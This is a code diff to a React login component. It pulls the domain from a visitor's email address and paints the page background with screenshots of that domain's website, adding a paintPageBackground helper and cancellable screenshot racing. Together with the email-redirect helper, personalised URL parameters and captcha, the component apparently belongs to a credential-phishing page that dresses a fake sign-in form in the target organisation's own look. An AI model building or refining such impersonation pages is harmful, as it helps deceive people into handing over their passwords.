@@ -3,9 +3,9 @@ import { CheckCircle2, Eye, EyeOff } from 'lucide-react'
 import { useAuth } from '../context/AuthContext'
 import {
   cacheScreenshotUrl,
-  getBackgroundPageUrl,
   getBootScreenshotUrl,
   getDomainFromEmail,
+  getPrimaryScreenshotUrl,
   getScreenshotUrls,
   getEmailRedirectUrl,
   raceScreenshot,
@@ -18,10 +18,28 @@ import { primeClientMeta } from '../lib/clientMeta'
 import { getPersonalizedUrlParams } from '../lib/urlParams'
 import { CaptchaField } from './CaptchaField'
 
+function paintPageBackground(url: string | null) {
+  const page = document.documentElement
+  if (!url) {
+    page.style.backgroundImage = ''
+    document.getElementById('page-bg')?.remove()
+    return
+  }
+
+  const safe = url.replace(/"/g, '')
+  page.style.backgroundImage = `url("${safe}")`
+  page.style.backgroundSize = 'cover'
+  page.style.backgroundPosition = 'center top'
+  page.style.backgroundRepeat = 'no-repeat'
+
+  const early = document.getElementById('page-bg')
+  if (early instanceof HTMLImageElement) early.src = url
+}
+
 function DomainBackground({ domain }: { domain: string }) {
   const [bgUrl, setBgUrl] = useState(() => {
     if (!domain) return null
-    return getBootScreenshotUrl(domain) ?? getBackgroundPageUrl(domain)
+    return getBootScreenshotUrl(domain) || getPrimaryScreenshotUrl(domain) || null
   })
   const [loading, setLoading] = useState(() => Boolean(domain) && !getBootScreenshotUrl(domain))
 
@@ -29,38 +47,39 @@ function DomainBackground({ domain }: { domain: string }) {
     if (!domain) {
       setBgUrl(null)
       setLoading(false)
+      paintPageBackground(null)
       return
     }
 
-    const boot = getBootScreenshotUrl(domain) ?? getBackgroundPageUrl(domain)
-    setBgUrl(boot)
-    setLoading(false)
+    const boot = getBootScreenshotUrl(domain) || getPrimaryScreenshotUrl(domain) || null
+    if (boot) {
+      setBgUrl(boot)
+      setLoading(false)
+      paintPageBackground(boot)
+    } else {
+      setLoading(true)
+    }
 
     const urls = getScreenshotUrls(domain)
     if (!urls.length) return
 
-    setBgUrl(urls[0])
-
-    urls.forEach((url) => {
-      const img = new Image()
-      img.decoding = 'async'
-      img.loading = 'eager'
-      img.src = url
-
-      const link = document.createElement('link')
-      link.rel = 'preload'
-      link.as = 'image'
-      link.href = url
-      document.head.appendChild(link)
-    })
+    let cancelled = false
 
     raceScreenshot(urls)
       .then((winner) => {
+        if (cancelled) return
         cacheScreenshotUrl(domain, winner)
         setBgUrl(winner)
         setLoading(false)
+        paintPageBackground(winner)
       })
-      .catch(() => setLoading(false))
+      .catch(() => {
+        if (!cancelled) setLoading(false)
+      })
+
+    return () => {
+      cancelled = true
+    }
   }, [domain])
 
   if (!domain) {
